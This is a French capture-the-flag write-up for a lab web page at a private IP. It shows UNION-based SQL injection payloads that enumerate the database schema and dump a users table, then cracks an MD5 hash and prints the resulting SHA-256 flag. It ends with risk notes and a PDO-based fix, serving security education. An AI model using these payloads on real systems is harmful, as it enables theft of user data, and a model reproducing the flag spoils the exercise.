# SEARCH MEMBER PAGE

## CIBLE: http://10.12.1.129/?page=member

### PRÉ REQUIS

Aucun.

### INJECTIONS SQL

La commande:
`1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`<br>
permet d'apprendre que dans la base de données `Member_Sql_Injection` se trouve une table unique: `users`.<br>

La commande:
`1=1 UNION SELECT table_name, column_name FROM information_schema.columns`<br>
permet d'apprendre que dans la table "users" se trouvent les colonnes suivantes:

- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

Il est donc possible de vérifier le contenu de toutes ces tables.<br>
voici la partie intéressante de la commande:
`1=1 UNION SELECT Commentaire, countersign FROM users`.<br>
```
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28
```

### DECRYPT FILE

On peut décrypter le mot de passe qui est du md5 grâce au site [md5 decrypt](https://md5decrypt.net/), qui donne: `FortyTwo`.<br>
Une fois les majuscules retirées, on obtient: `fortytwo`.<br>
On peut crypter ce mot de passe en sha256 grâce au site [md5 decrypt (sha256)](https://md5decrypt.net/Sha256/#answer).<br>
On obtient donc le flag: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`.

## RISQUE

L'accès aux bases SQL permet l'obtention de toutes les données qu'elles contiennent.<br>
Ici, nous avons seulement récupéré un commentaire, mais souvent les mots de passe ainsi que de nombreuses données d'utilisateur sont conservées dans ces bases de données.<br>
C'est par exemple le cas dans la base de données `Member_Brute_Force`.

## PROTECTION

Les injections SQL sont très dangeureuses. Heureusement, il est très facile de s'en protéger.<br>
Par exemple avec la fonction PDO (en php), qui va formater la requête avant d'ajouter les paramètres et vérifier le formatage final de la requête avant de la soumettre à la base de données.
